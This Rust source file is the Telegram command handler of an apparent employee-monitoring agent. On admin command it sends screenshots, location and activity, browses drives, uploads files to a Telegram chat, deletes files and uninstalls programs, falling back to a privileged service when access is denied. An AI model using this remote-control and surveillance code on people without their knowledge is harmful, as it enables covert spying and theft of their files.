use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::{Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant};

use ftracker_core::config::{windows_user, AppConfig};
use ftracker_core::paths;
use ftracker_core::report::day_totals::{self, required_seconds, MonthDayRow};
use ftracker_core::report::pdf;
use ftracker_core::telegram::client::{inline_markup, InlineBtn, TelegramClient};
use ftracker_core::telegram::commands::{self, AdminCommand};
use ftracker_core::telegram::messages::{self, LiveSnapshot};
use ftracker_core::GeoFix;
use ftracker_ipc::protocol::IpcMsg;
use serde::{Deserialize, Serialize};

use crate::activity;
use crate::admin_fs;
use crate::app::SessionState;
use crate::metrics;
use crate::screenshot;

/// Slow poll: worst-case reply ≈ confirm delay + one sleep (~28s).
const POLL_SLEEP: Duration = Duration::from_secs(8);
const ERR_SLEEP: Duration = Duration::from_secs(8);
const SNAPSHOT_DEBOUNCE: Duration = Duration::from_secs(15);
const MONTH_PDF_DEBOUNCE: Duration = Duration::from_secs(45);
const LIST_DEBOUNCE: Duration = Duration::from_secs(20);
const FS_DEBOUNCE: Duration = Duration::from_secs(2);
const LIVE_JPEG_WIDTH: u32 = 1920;
const LIVE_JPEG_QUALITY: u8 = 90;
const SHOT_DEBOUNCE: Duration = Duration::from_secs(8);
const SLOT_TTL: Duration = Duration::from_secs(15 * 60);

static SLOT_SEQ: AtomicU32 = AtomicU32::new(1);
static REQ_SEQ: AtomicU64 = AtomicU64::new(1);

fn slots() -> &'static Mutex<HashMap<u32, Slot>> {
    static SLOTS: OnceLock<Mutex<HashMap<u32, Slot>>> = OnceLock::new();
    SLOTS.get_or_init(|| Mutex::new(HashMap::new()))
}

fn ipc_wait() -> &'static Mutex<HashMap<String, IpcWait>> {
    static IPC_WAIT: OnceLock<Mutex<HashMap<String, IpcWait>>> = OnceLock::new();
    IPC_WAIT.get_or_init(|| Mutex::new(HashMap::new()))
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AdminCmd {
    Online,
    Snapshot,
    Shot,
    MonthData,
    List,
}

enum Job {
    Online {
        chat: String,
        employee: String,
        windows_user: String,
        pc: String,
        idle: bool,
        loc: Option<GeoFix>,
    },
    Snapshot {
        chat: String,
        employee: String,
        windows_user: String,
        pc: String,
        idle: bool,
        fg: activity::foreground::Foreground,
        loc: Option<GeoFix>,
        tracked: i64,
        required: i64,
        cats: Vec<(String, i64)>,
    },
    MonthPdf {
        chat: String,
        employee: String,
        windows_user: String,
        pc: String,
        from: String,
        to: String,
        rows: Vec<MonthDayRow>,
        cfg: AppConfig,
    },
    CommandList {
        chat: String,
    },
    ShotOnly {
        chat: String,
        employee: String,
        pc: String,
    },
    Files {
        ctx: FsCtx,
        path: Option<String>,
    },
    Get {
        ctx: FsCtx,
        path: String,
    },
    Copy {
        ctx: FsCtx,
        src: String,
        dest: String,
    },
    AskDel {
        ctx: FsCtx,
        path: String,
    },
    AskUninstall {
        ctx: FsCtx,
        display: String,
    },
    Programs {
        ctx: FsCtx,
    },
    Callback {
        ctx: FsCtx,
        query_id: String,
        data: String,
    },
    IpcDone {
        req_id: String,
        ok: bool,
        detail: String,
    },
}

#[derive(Clone)]
struct FsCtx {
    chat: String,
    employee: String,
    pc: String,
    tag: String,
}

struct Slot {
    kind: SlotKind,
    at: Instant,
}

#[derive(Clone)]
enum SlotKind {
    Open(PathBuf),
    Get(PathBuf),
    AskDel(PathBuf),
    AskUninstall(String),
    ConfirmDel(PathBuf),
    ConfirmUninstall(String),
}

struct IpcWait {
    ctx: FsCtx,
    op: String,
    path: String,
    kind: IpcWaitKind,
}

enum IpcWaitKind {
    Log,
    Get { staged: PathBuf, filename: String },
}

#[derive(Debug, Serialize, Deserialize, Default, PartialEq)]
struct OffsetState {
    processed: i64,
    confirmed: i64,
}

pub fn start(
    cfg: AppConfig,
    client: TelegramClient,
    ipc_tx: Sender<IpcMsg>,
) -> (Receiver<AdminCmd>, JobHandle) {
    let (cmd_tx, cmd_rx) = mpsc::channel();
    let (job_tx, job_rx) = mpsc::channel::<Job>();
    let poll_client = client.clone();
    let worker_client = client;
    let poll_jobs = job_tx.clone();
    let _ = thread::Builder::new()
        .name("ft-tg-poll".into())
        .spawn(move || {
            lower_priority();
            poll_loop(cfg, poll_client, cmd_tx, poll_jobs);
        });
    let _ = thread::Builder::new()
        .name("ft-tg-send".into())
        .spawn(move || {
            lower_priority();
            worker_loop(worker_client, job_rx, ipc_tx);
        });
    (cmd_rx, JobHandle(job_tx))
}

/// Cheap cloneable queue into the silent send worker.
#[derive(Clone)]
pub struct JobHandle(Sender<Job>);

pub fn on_privileged_result(jobs: &JobHandle, req_id: &str, ok: bool, detail: &str) {
    let _ = jobs.0.send(Job::IpcDone {
        req_id: req_id.to_string(),
        ok,
        detail: detail.to_string(),
    });
}

fn lower_priority() {
    #[cfg(windows)]
    unsafe {
        use windows::Win32::System::Threading::{
            GetCurrentThread, SetThreadPriority, THREAD_PRIORITY_BELOW_NORMAL,
        };
        let _ = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    }
}

fn cb_tag(machine_id: &str) -> String {
    let mut h: u32 = 2_166_136_261;
    for b in machine_id.as_bytes() {
        h ^= u32::from(*b);
        h = h.wrapping_mul(16_777_619);
    }
    format!("{h:x}")
}

fn fs_ctx(cfg: &AppConfig, chat: &str) -> FsCtx {
    FsCtx {
        chat: chat.to_string(),
        employee: cfg.employee_name.clone(),
        pc: cfg.machine_id.clone(),
        tag: cb_tag(&cfg.machine_id),
    }
}

fn cb_data(op: char, tag: &str, id: u32) -> String {
    format!("{op}:{tag}:{id:x}")
}

fn poll_loop(cfg: AppConfig, client: TelegramClient, tx: Sender<AdminCmd>, jobs: Sender<Job>) {
    let _ = client.delete_webhook();
    let mut state = load_offset();
    let mut last_fs = Instant::now()
        .checked_sub(Duration::from_secs(60))
        .unwrap_or_else(Instant::now);
    loop {
        match client.get_updates(state.confirmed + 1, 0) {
            Ok(updates) => {
                let now = chrono::Utc::now().timestamp();
                let before = state.processed;
                let conf_before = state.confirmed;
                let mut fleet_cmd = false;
                let mut list_id: Option<i64> = None;
                for u in &updates {
                    if u.update_id <= state.processed {
                        continue;
                    }
                    let is_cb = u.callback_query_id.is_some();
                    if !commands::chat_matches(&u.chat_id, &cfg.telegram_admin_chat_id)
                        || (!is_cb && commands::is_stale(u.date, now))
                    {
                        state.processed = state.processed.max(u.update_id);
                        continue;
                    }
                    if is_cb {
                        if let (Some(qid), Some(data)) =
                            (u.callback_query_id.as_ref(), u.callback_data.as_ref())
                        {
                            if jobs
                                .send(Job::Callback {
                                    ctx: fs_ctx(&cfg, &u.chat_id),
                                    query_id: qid.clone(),
                                    data: data.clone(),
                                })
                                .is_err()
                            {
                                return;
                            }
                        }
                        state.processed = state.processed.max(u.update_id);
                        continue;
                    }
                    match commands::parse_command(&u.text) {
                        Some(AdminCommand::Online) => {
                            fleet_cmd = true;
                            if tx.send(AdminCmd::Online).is_err() {
                                return;
                            }
                        }
                        Some(AdminCommand::MonthData) => {
                            fleet_cmd = true;
                            if tx.send(AdminCmd::MonthData).is_err() {
                                return;
                            }
                        }
                        Some(AdminCommand::List) => {
                            list_id = Some(u.update_id);
                            if tx.send(AdminCmd::List).is_err() {
                                return;
                            }
                        }
                        Some(AdminCommand::Who(name)) => {
                            fleet_cmd = true;
                            if commands::names_match(&name, &cfg.employee_name, &windows_user()) {
                                if tx.send(AdminCmd::Snapshot).is_err() {
                                    return;
                                }
                            }
                        }
                        Some(AdminCommand::WhoShot(name)) => {
                            fleet_cmd = true;
                            if commands::names_match(&name, &cfg.employee_name, &windows_user()) {
                                if tx.send(AdminCmd::Shot).is_err() {
                                    return;
                                }
                            }
                        }
                        Some(cmd) => {
                            fleet_cmd = true;
                            if let Some(name) = cmd.target_name() {
                                if commands::names_match(name, &cfg.employee_name, &windows_user())
                                {
                                    if last_fs.elapsed() >= FS_DEBOUNCE {
                                        last_fs = Instant::now();
                                        if send_fs_job(&jobs, fs_ctx(&cfg, &u.chat_id), cmd)
                                            .is_err()
                                        {
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                        None => {}
                    }
                    state.processed = state.processed.max(u.update_id);
                }
                if !fleet_cmd {
                    if let Some(id) = list_id {
                        state.confirmed = state.confirmed.max(id);
                    }
                }
                state.confirmed = commands::confirm_upto(
                    updates.iter().map(|u| (u.update_id, u.date)),
                    state.confirmed,
                    now,
                );
                if state.processed != before || state.confirmed != conf_before {
                    save_offset(&state);
                }
            }
            Err(_) => thread::sleep(ERR_SLEEP),
        }
        thread::sleep(POLL_SLEEP);
    }
}

fn send_fs_job(jobs: &Sender<Job>, ctx: FsCtx, cmd: AdminCommand) -> Result<(), ()> {
    let job = match cmd {
        AdminCommand::Files { path, .. } => Job::Files { ctx, path },
        AdminCommand::Get { path, .. } => Job::Get { ctx, path },
        AdminCommand::Copy { src, dest, .. } => Job::Copy { ctx, src, dest },
        AdminCommand::Del { path, .. } => Job::AskDel { ctx, path },
        AdminCommand::Programs { .. } => Job::Programs { ctx },
        AdminCommand::Uninstall { display, .. } => Job::AskUninstall { ctx, display },
        _ => return Ok(()),
    };
    jobs.send(job).map_err(|_| ())
}

fn load_offset() -> OffsetState {
    let path = match paths::telegram_offset_path() {
        Ok(p) => p,
        Err(_) => return OffsetState::default(),
    };
    let bytes = match std::fs::read(&path) {
        Ok(b) => b,
        Err(_) => return OffsetState::default(),
    };
    serde_json::from_slice(&bytes).unwrap_or_default()
}

fn save_offset(state: &OffsetState) {
    if let Ok(path) = paths::telegram_offset_path() {
        if let Ok(bytes) = serde_json::to_vec(state) {
            let _ = std::fs::write(path, bytes);
        }
    }
}

fn worker_loop(client: TelegramClient, rx: Receiver<Job>, ipc: Sender<IpcMsg>) {
    while let Ok(job) = rx.recv() {
        match job {
            Job::Online {
                chat,
                employee,
                windows_user,
                pc,
                idle,
                loc,
            } => {
                let body = messages::online_here(&employee, &windows_user, &pc, idle, loc.as_ref());
                let _ = client.send_admin(&chat, &body, loc.as_ref());
            }
            Job::Snapshot {
                chat,
                employee,
                windows_user,
                pc,
                idle,
                fg,
                loc,
                tracked,
                required,
                cats,
            } => {
                send_snapshot(
                    &client,
                    &chat,
                    employee,
                    windows_user,
                    pc,
                    idle,
                    fg,
                    loc,
                    tracked,
                    required,
                    cats,
                );
            }
            Job::MonthPdf {
                chat,
                employee,
                windows_user,
                pc,
                from,
                to,
                rows,
                cfg,
            } => {
                send_month_pdf(
                    &client,
                    &chat,
                    employee,
                    windows_user,
                    pc,
                    from,
                    to,
                    rows,
                    &cfg,
                );
            }
            Job::CommandList { chat } => {
                let _ = client.send_message(&chat, &messages::command_list());
            }
            Job::ShotOnly { chat, employee, pc } => {
                send_shot_only(&client, &chat, employee, pc);
            }
            Job::Files { ctx, path } => do_files(&client, &ctx, path.as_deref()),
            Job::Get { ctx, path } => do_get(&client, &ipc, &ctx, &path),
            Job::Copy { ctx, src, dest } => do_copy(&client, &ipc, &ctx, &src, &dest),
            Job::AskDel { ctx, path } => do_ask_del(&client, &ctx, &path),
            Job::AskUninstall { ctx, display } => do_ask_uninstall(&client, &ctx, &display),
            Job::Programs { ctx } => do_programs(&client, &ctx),
            Job::Callback {
                ctx,
                query_id,
                data,
            } => do_callback(&client, &ipc, &ctx, &query_id, &data),
            Job::IpcDone { req_id, ok, detail } => do_ipc_done(&client, req_id, ok, detail),
        }
    }
}

pub fn handle(session: &mut SessionState, jobs: &JobHandle, cmd: AdminCmd) {
    match cmd {
        AdminCmd::Online => {
            let _ = jobs.0.send(Job::Online {
                chat: session.cfg.telegram_admin_chat_id.clone(),
                employee: session.cfg.employee_name.clone(),
                windows_user: windows_user(),
                pc: session.cfg.machine_id.clone(),
                idle: session.idle,
                loc: session.last_loc.clone(),
            });
        }
        AdminCmd::Snapshot => {
            if let Some(prev) = session.last_snapshot {
                if prev.elapsed() < SNAPSHOT_DEBOUNCE {
                    return;
                }
            }
            session.last_snapshot = Some(Instant::now());
            let day = day_totals::today_iso();
            let tracked = session.store.day_counted(&day).unwrap_or(0);
            let cats = session.store.category_seconds(&day).unwrap_or_default();
            let required = required_seconds(session.cfg.daily_hours_required);
            let _ = jobs.0.send(Job::Snapshot {
                chat: session.cfg.telegram_admin_chat_id.clone(),
                employee: session.cfg.employee_name.clone(),
                windows_user: windows_user(),
                pc: session.cfg.machine_id.clone(),
                idle: session.idle,
                fg: session.last_fg.clone(),
                loc: session.last_loc.clone(),
                tracked,
                required,
                cats,
            });
        }
        AdminCmd::Shot => {
            if let Some(prev) = session.last_snapshot {
                if prev.elapsed() < SHOT_DEBOUNCE {
                    return;
                }
            }
            session.last_snapshot = Some(Instant::now());
            let _ = jobs.0.send(Job::ShotOnly {
                chat: session.cfg.telegram_admin_chat_id.clone(),
                employee: session.cfg.employee_name.clone(),
                pc: session.cfg.machine_id.clone(),
            });
        }
        AdminCmd::List => {
            if let Some(prev) = session.last_list {
                if prev.elapsed() < LIST_DEBOUNCE {
                    return;
                }
            }
            session.last_list = Some(Instant::now());
            let _ = jobs.0.send(Job::CommandList {
                chat: session.cfg.telegram_admin_chat_id.clone(),
            });
        }
        AdminCmd::MonthData => {
            if let Some(prev) = session.last_month_pdf {
                if prev.elapsed() < MONTH_PDF_DEBOUNCE {
                    return;
                }
            }
            session.last_month_pdf = Some(Instant::now());
            let (from_d, to_d) = day_totals::last_month_bounds();
            let from = from_d.format("%Y-%m-%d").to_string();
            let to = to_d.format("%Y-%m-%d").to_string();
            let rows =
                day_totals::collect_month_rows(&session.store, session.cfg.daily_hours_required);
            let _ = jobs.0.send(Job::MonthPdf {
                chat: session.cfg.telegram_admin_chat_id.clone(),
                employee: session.cfg.employee_name.clone(),
                windows_user: windows_user(),
                pc: session.cfg.machine_id.clone(),
                from,
                to,
                rows,
                cfg: session.cfg.clone(),
            });
        }
    }
}

fn send_log(client: &TelegramClient, ctx: &FsCtx, op: &str, path: &str, result: &str) {
    let body = messages::admin_work_log(&ctx.employee, &ctx.pc, op, path, result);
    let _ = client.send_message(&ctx.chat, &body);
}

fn send_log_markup(
    client: &TelegramClient,
    ctx: &FsCtx,
    op: &str,
    path: &str,
    result: &str,
    extra: &str,
    markup: Option<&str>,
) {
    let mut body = messages::admin_work_log(&ctx.employee, &ctx.pc, op, path, result);
    if !extra.is_empty() {
        body.push('\n');
        body.push('\n');
        body.push_str(extra);
    }
    let _ = client.send_message_markup(&ctx.chat, &body, markup);
}

fn do_files(client: &TelegramClient, ctx: &FsCtx, path: Option<&str>) {
    match path {
        None | Some("") => {
            let drives = admin_fs::list_drives();
            let extra = admin_fs::format_drives(&drives);
            let mut rows: Vec<Vec<InlineBtn>> = Vec::new();
            let mut row = Vec::new();
            for d in &drives {
                let id = alloc_slot(SlotKind::Open(d.clone()));
                row.push(btn(&d.display().to_string(), &cb_data('o', &ctx.tag, id)));
                if row.len() == 3 {
                    rows.push(std::mem::take(&mut row));
                }
            }
            if !row.is_empty() {
                rows.push(row);
            }
            let mk = if rows.is_empty() {
                None
            } else {
                Some(inline_markup(&rows))
            };
            send_log_markup(client, ctx, "list", "(drives)", "ok", &extra, mk.as_deref());
        }
        Some(p) => send_listing(client, ctx, Path::new(p)),
    }
}

fn send_listing(client: &TelegramClient, ctx: &FsCtx, path: &Path) {
    match admin_fs::list_dir(path) {
        Ok(list) => {
            let extra = admin_fs::format_listing(&list);
            let rows = listing_buttons(&list, &ctx.tag);
            let mk = if rows.is_empty() {
                None
            } else {
                Some(inline_markup(&rows))
            };
            send_log_markup(client, ctx, "list", &list.path, "ok", &extra, mk.as_deref());
        }
        Err(e) => send_log(
            client,
            ctx,
            "list",
            &path.display().to_string(),
            &format!("{e}"),
        ),
    }
}

fn listing_buttons(list: &admin_fs::DirListing, tag: &str) -> Vec<Vec<InlineBtn>> {
    let mut rows = Vec::new();
    if let Some(p) = &list.parent {
        let id = alloc_slot(SlotKind::Open(p.clone()));
        rows.push(vec![btn("Parent", &cb_data('o', tag, id))]);
    } else {
        let id = alloc_slot(SlotKind::Open(PathBuf::new()));
        rows.push(vec![btn("Drives", &cb_data('o', tag, id))]);
    }
    let cur = PathBuf::from(&list.path);
    if admin_fs::refuse_delete(&cur).is_none() {
        let id = alloc_slot(SlotKind::AskDel(cur));
        rows.push(vec![btn("Delete this folder", &cb_data('d', tag, id))]);
    }
    for d in list.dirs.iter().take(16) {
        let id = alloc_slot(SlotKind::Open(d.clone()));
        rows.push(vec![btn(
            &format!("Open {}", trunc_name(d)),
            &cb_data('o', tag, id),
        )]);
    }
    for (f, _) in list.files.iter().take(10) {
        let gid = alloc_slot(SlotKind::Get(f.clone()));
        let did = alloc_slot(SlotKind::AskDel(f.clone()));
        rows.push(vec![
            btn(&format!("Get {}", trunc_name(f)), &cb_data('g', tag, gid)),
            btn("Del", &cb_data('d', tag, did)),
        ]);
    }
    rows
}

fn do_get(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str) {
    let p = Path::new(path);
    if p.is_dir() {
        send_log(client, ctx, "get", path, "path is a folder — use files");
        return;
    }
    match admin_fs::read_file_capped(p) {
        Ok((bytes, n)) => {
            let name = p
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| "file.bin".into());
            let cap = messages::admin_work_log(
                &ctx.employee,
                &ctx.pc,
                "get",
                path,
                &format!("ok {}", admin_fs::format_size(n)),
            );
            let _ = client.send_document(&ctx.chat, &name, &bytes, &cap);
        }
        Err(e) if paths::is_access_denied(&e) => {
            let req_id = next_req();
            let staged = match paths::program_data() {
                Ok(d) => d.join(format!("admin-get-{req_id}.bin")),
                Err(err) => {
                    send_log(client, ctx, "get", path, &format!("{err}"));
                    return;
                }
            };
            let filename = p
                .file_name()
                .map(|s| s.to_string_lossy().into_owned())
                .unwrap_or_else(|| "file.bin".into());
            if let Ok(mut m) = ipc_wait().lock() {
                m.insert(
                    req_id.clone(),
                    IpcWait {
                        ctx: ctx.clone(),
                        op: "get".into(),
                        path: path.into(),
                        kind: IpcWaitKind::Get {
                            staged: staged.clone(),
                            filename,
                        },
                    },
                );
            }
            let _ = ipc.send(IpcMsg::AdminFs {
                op: "stage".into(),
                path: path.into(),
                dest: staged.display().to_string(),
                req_id,
            });
        }
        Err(e) => send_log(client, ctx, "get", path, &format!("{e}")),
    }
}

fn do_copy(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, src: &str, dest: &str) {
    match admin_fs::copy_any(Path::new(src), Path::new(dest)) {
        Ok(n) => send_log(
            client,
            ctx,
            "copy",
            &format!("{src} => {dest}"),
            &format!("ok {}", admin_fs::format_size(n)),
        ),
        Err(e) if paths::is_access_denied(&e) => {
            request_system(
                ipc,
                IpcWait {
                    ctx: ctx.clone(),
                    op: "copy".into(),
                    path: format!("{src} => {dest}"),
                    kind: IpcWaitKind::Log,
                },
                "copy",
                src,
                dest,
            );
        }
        Err(e) => send_log(
            client,
            ctx,
            "copy",
            &format!("{src} => {dest}"),
            &format!("{e}"),
        ),
    }
}

fn do_ask_del(client: &TelegramClient, ctx: &FsCtx, path: &str) {
    let p = Path::new(path);
    if let Some(msg) = admin_fs::refuse_delete(p) {
        send_log(client, ctx, "del", path, msg);
        return;
    }
    let id = alloc_slot(SlotKind::ConfirmDel(p.to_path_buf()));
    let rows = vec![vec![
        btn("Yes", &cb_data('y', &ctx.tag, id)),
        btn("No", &cb_data('n', &ctx.tag, id)),
    ]];
    send_log_markup(
        client,
        ctx,
        "del",
        path,
        "confirm",
        "Delete this path? Tap Yes or No.",
        Some(&inline_markup(&rows)),
    );
}

fn do_del(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, path: &str) {
    match admin_fs::delete_any(Path::new(path)) {
        Ok(n) => send_log(
            client,
            ctx,
            "del",
            path,
            &format!("ok {}", admin_fs::format_size(n)),
        ),
        Err(e) if paths::is_access_denied(&e) => {
            request_system(
                ipc,
                IpcWait {
                    ctx: ctx.clone(),
                    op: "del".into(),
                    path: path.into(),
                    kind: IpcWaitKind::Log,
                },
                "delete",
                path,
                "",
            );
        }
        Err(e) => send_log(client, ctx, "del", path, &format!("{e}")),
    }
}

fn do_programs(client: &TelegramClient, ctx: &FsCtx) {
    let rows = admin_fs::list_programs();
    let extra = admin_fs::format_programs(&rows);
    let mut buttons = Vec::new();
    for p in rows.iter().take(8) {
        if admin_fs::is_ftracker_program(&p.name) {
            continue;
        }
        let id = alloc_slot(SlotKind::AskUninstall(p.name.clone()));
        buttons.push(vec![btn(
            &format!("Uninstall {}", trunc_str(&p.name, 28)),
            &cb_data('u', &ctx.tag, id),
        )]);
    }
    let mk = if buttons.is_empty() {
        None
    } else {
        Some(inline_markup(&buttons))
    };
    send_log_markup(
        client,
        ctx,
        "programs",
        "(installed)",
        &format!("ok {}", rows.len()),
        &extra,
        mk.as_deref(),
    );
}

fn do_ask_uninstall(client: &TelegramClient, ctx: &FsCtx, display: &str) {
    if admin_fs::is_ftracker_program(display) {
        send_log(
            client,
            ctx,
            "uninstall",
            display,
            "refused: Ftracker cannot be uninstalled this way",
        );
        return;
    }
    match admin_fs::find_program(display) {
        Some(p) => {
            let id = alloc_slot(SlotKind::ConfirmUninstall(p.name.clone()));
            let rows = vec![vec![
                btn("Yes", &cb_data('y', &ctx.tag, id)),
                btn("No", &cb_data('n', &ctx.tag, id)),
            ]];
            send_log_markup(
                client,
                ctx,
                "uninstall",
                &p.name,
                "confirm",
                "Uninstall this program? Tap Yes or No.",
                Some(&inline_markup(&rows)),
            );
        }
        None => send_log(client, ctx, "uninstall", display, "program not found"),
    }
}

fn do_uninstall(client: &TelegramClient, ipc: &Sender<IpcMsg>, ctx: &FsCtx, display: &str) {
    if admin_fs::is_ftracker_program(display) {
        send_log(
            client,
            ctx,
            "uninstall",
            display,
            "refused: Ftracker cannot be uninstalled this way",
        );
        return;
    }
    request_system(
        ipc,
        IpcWait {
            ctx: ctx.clone(),
            op: "uninstall".into(),
            path: display.into(),
            kind: IpcWaitKind::Log,
        },
        "uninstall",
        display,
        "",
    );
}

fn do_callback(
    client: &TelegramClient,
    ipc: &Sender<IpcMsg>,
    ctx: &FsCtx,
    query_id: &str,
    data: &str,
) {
    let Some((op, id)) = parse_cb(data, &ctx.tag) else {
        return;
    };
    let Some(kind) = take_slot(id) else {
        let _ = client.answer_callback(query_id, "expired");
        return;
    };
    let _ = client.answer_callback(query_id, "");
    match (op, kind) {
        ('o', SlotKind::Open(p)) => {
            if p.as_os_str().is_empty() {
                do_files(client, ctx, None);
            } else {
                send_listing(client, ctx, &p);
            }
        }
        ('g', SlotKind::Get(p)) => do_get(client, ipc, ctx, &p.display().to_string()),
        ('d', SlotKind::AskDel(p)) => do_ask_del(client, ctx, &p.display().to_string()),
        ('u', SlotKind::AskUninstall(name)) => do_ask_uninstall(client, ctx, &name),
        ('y', SlotKind::ConfirmDel(p)) => do_del(client, ipc, ctx, &p.display().to_string()),
        ('y', SlotKind::ConfirmUninstall(name)) => do_uninstall(client, ipc, ctx, &name),
        ('n', SlotKind::ConfirmDel(p)) => {
            send_log(client, ctx, "del", &p.display().to_string(), "cancelled")
        }
        ('n', SlotKind::ConfirmUninstall(name)) => {
            send_log(client, ctx, "uninstall", &name, "cancelled")
        }
        _ => {}
    }
}

fn do_ipc_done(client: &TelegramClient, req_id: String, ok: bool, detail: String) {
    let wait = match ipc_wait().lock() {
        Ok(mut m) => m.remove(&req_id),
        Err(_) => None,
    };
    let Some(wait) = wait else {
        return;
    };
    match wait.kind {
        IpcWaitKind::Get { staged, filename } => {
            if !ok {
                send_log(client, &wait.ctx, "get", &wait.path, &detail);
                let _ = std::fs::remove_file(&staged);
                return;
            }
            match admin_fs::read_file_capped(&staged) {
                Ok((bytes, n)) => {
                    let cap = messages::admin_work_log(
                        &wait.ctx.employee,
                        &wait.ctx.pc,
                        "get",
                        &wait.path,
                        &format!("ok {}", admin_fs::format_size(n)),
                    );
                    let _ = client.send_document(&wait.ctx.chat, &filename, &bytes, &cap);
                }
                Err(e) => send_log(client, &wait.ctx, "get", &wait.path, &format!("{e}")),
            }
            let _ = std::fs::remove_file(&staged);
        }
        IpcWaitKind::Log => {
            let result = if ok { format!("ok {detail}") } else { detail };
            send_log(client, &wait.ctx, &wait.op, &wait.path, &result);
        }
    }
}

fn request_system(ipc: &Sender<IpcMsg>, wait: IpcWait, op: &str, path: &str, dest: &str) {
    let req_id = next_req();
    if let Ok(mut m) = ipc_wait().lock() {
        m.insert(req_id.clone(), wait);
    }
    let _ = ipc.send(IpcMsg::AdminFs {
        op: op.to_string(),
        path: path.to_string(),
        dest: dest.to_string(),
        req_id,
    });
}

fn next_req() -> String {
    format!("{:x}", REQ_SEQ.fetch_add(1, Ordering::Relaxed))
}

fn alloc_slot(kind: SlotKind) -> u32 {
    prune_slots();
    let id = SLOT_SEQ.fetch_add(1, Ordering::Relaxed);
    if let Ok(mut m) = slots().lock() {
        m.insert(
            id,
            Slot {
                kind,
                at: Instant::now(),
            },
        );
    }
    id
}

fn take_slot(id: u32) -> Option<SlotKind> {
    slots().lock().ok()?.remove(&id).map(|s| s.kind)
}

fn prune_slots() {
    let Ok(mut m) = slots().lock() else {
        return;
    };
    let now = Instant::now();
    m.retain(|_, s| now.saturating_duration_since(s.at) < SLOT_TTL);
}

fn parse_cb(data: &str, tag: &str) -> Option<(char, u32)> {
    let mut parts = data.splitn(3, ':');
    let op = parts.next()?;
    let t = parts.next()?;
    let id = parts.next()?;
    if t != tag {
        return None;
    }
    let ch = op.chars().next()?;
    let n = u32::from_str_radix(id, 16).ok()?;
    Some((ch, n))
}

fn btn(text: &str, data: &str) -> InlineBtn {
    InlineBtn {
        text: trunc_str(text, 40),
        data: data.to_string(),
    }
}

fn trunc_name(p: &Path) -> String {
    trunc_str(&p.file_name().unwrap_or_default().to_string_lossy(), 28)
}

fn trunc_str(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        s.to_string()
    } else {
        let t: String = s.chars().take(max.saturating_sub(1)).collect();
        format!("{t}…")
    }
}

fn send_month_pdf(
    client: &TelegramClient,
    chat: &str,
    employee: String,
    user: String,
    pc: String,
    from: String,
    to: String,
    rows: Vec<MonthDayRow>,
    cfg: &AppConfig,
) {
    let tracked: i64 = rows.iter().map(|r| r.counted_s).sum();
    let required: i64 = rows.iter().map(|r| r.required_s).sum();
    let short_days = rows.iter().filter(|r| r.short).count();
    let caption = messages::month_data_caption(
        &employee, &user, &pc, &from, &to, tracked, required, short_days,
    );
    match pdf::build_month_pdf(cfg, &user, &from, &to, &rows) {
        Ok(bytes) => {
            let safe: String = employee
                .chars()
                .map(|c| if c.is_alphanumeric() { c } else { '_' })
                .collect();
            let name = format!("ftracker-month-{safe}-{from}-to-{to}.pdf");
            let _ = client.send_document(chat, &name, &bytes, &caption);
        }
        Err(_) => {
            let _ = client.send_message(chat, &caption);
        }
    }
}

fn send_snapshot(
    client: &TelegramClient,
    chat: &str,
    employee: String,
    user: String,
    pc: String,
    idle: bool,
    fg: activity::foreground::Foreground,
    loc: Option<GeoFix>,
    tracked: i64,
    required: i64,
    cats: Vec<(String, i64)>,
) {
    let host = metrics::collect();
    let usb = metrics::removable_volumes();
    let apps = activity::visible::process_names(12);
    let fg_proc = activity::foreground::process_file_name(&fg.process);
    let fg_title = ftracker_core::redact::redact_title(&fg.title);
    let jpeg = screenshot::capture_jpeg(LIVE_JPEG_WIDTH, LIVE_JPEG_QUALITY)
        .ok()
        .flatten()
        .map(|(j, _)| j);
    let snap = LiveSnapshot {
        employee: employee.clone(),
        windows_user: user,
        pc: pc.clone(),
        idle,
        tracked_today_s: tracked,
        required_s: required,
        cats,
        fg_process: fg_proc,
        fg_title,
        apps,
        usb,
        cpu_pct: host.cpu_pct,
        ram_used_mb: host.ram_used_mb,
        ram_total_mb: host.ram_total_mb,
        disk_root: host.disk_root,
        disk_free_gb: host.disk_free_gb,
        disk_total_gb: host.disk_total_gb,
        loc: loc.clone(),
    };
    let body = messages::live_status(&snap);
    let _ = client.send_admin(chat, &body, loc.as_ref());
    if let Some(bytes) = jpeg {
        let caption = format!("Screenshot\nEmployee: {employee}\nPC: {pc}");
        let _ = client.send_photo(chat, "screenshot.jpg", &bytes, &caption);
    }
}

fn send_shot_only(client: &TelegramClient, chat: &str, employee: String, pc: String) {
    let caption = messages::screenshot_only_caption(&employee, &pc);
    match screenshot::capture_jpeg(LIVE_JPEG_WIDTH, LIVE_JPEG_QUALITY) {
        Ok(Some((bytes, _))) => {
            let _ = client.send_photo(chat, "screenshot.jpg", &bytes, &caption);
        }
        _ => {
            let _ = client.send_message(chat, &format!("{caption}\n(no screenshot)"));
        }
    }
}
